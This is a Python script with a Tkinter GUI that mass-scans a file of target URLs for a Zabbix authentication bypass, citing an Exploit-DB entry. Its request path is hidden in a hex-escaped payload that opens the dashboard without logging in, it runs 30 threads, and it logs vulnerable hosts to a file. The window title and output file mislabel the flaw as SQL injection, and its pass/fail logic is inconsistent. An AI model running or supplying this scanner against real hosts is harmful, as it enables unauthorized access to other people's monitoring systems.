import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
"""
zabbix 身份认证错误
https://www.exploit-db.com/exploits/47474
"""
def zabbix_auth_exp(url):
    zabbix_text = "Zabbix"
    zabbix_path = url + "/zabbix"
    payload = "\x2f\x7a\x61\x62\x62\x69\x78\x2e\x70\x68\x70\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x2e\x76\x69\x65\x77\x26\x64\x61\x73\x68\x62\x6f\x61\x72\x64\x69\x64\x3d\x31"
    headers = {
        "User-Agent": "Opera/9.61 (Macintosh; Intel Mac OS X; U; de) Presto/2.1.1",
        "Referer": url,
        "Content-Type": "application/x-www-form-urlencoded"
    }
    url_payload = f"{url}{payload}"
    try:
        path_request = requests.get(zabbix_path, verify=False, timeout=5)
        path_content = path_request.text
        if (zabbix_text in path_content):
            payload_request = requests.get(url_payload, headers=headers, verify=False, timeout=10)
            if payload_request.status_code == 200:
                if 'Global view' in payload_request.text:
                    zabbix_auth_bypass.insert(END,"【*】存在漏洞的url：" + url + "\n")
                    zabbix_auth_bypass.see(END)
                    with open ("存在Zabbix—SQL注入漏洞的url.txt", 'a') as f:
                        f.write(url + "\n")
        else:
            zabbix_auth_bypass.insert(END, "【×】不存在漏洞的url：" + url + "\n")
            zabbix_auth_bypass.see(END)
    except Exception as err:
        zabbix_auth_bypass.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        zabbix_auth_bypass.see(END)
def get_zabbix_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def zabbix_auth_gui():
    zabbix_auth_poc = tk.Tk()
    zabbix_auth_poc.geometry("910x450")
    zabbix_auth_poc.title("Zabbix—SQL注入 漏洞一把梭")
    zabbix_auth_poc.resizable(0, 0)
    zabbix_auth_poc.iconbitmap('logo.ico')
    global zabbix_auth_bypass
    zabbix_auth_bypass = scrolledtext.ScrolledText(zabbix_auth_poc,width=123, height=25)
    zabbix_auth_bypass.grid(row=0, column=0, padx=10, pady=10)
    zabbix_auth_bypass.see(END)
    addrs = get_zabbix_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(zabbix_auth_exp, addr)
    zabbix_auth_poc.mainloop()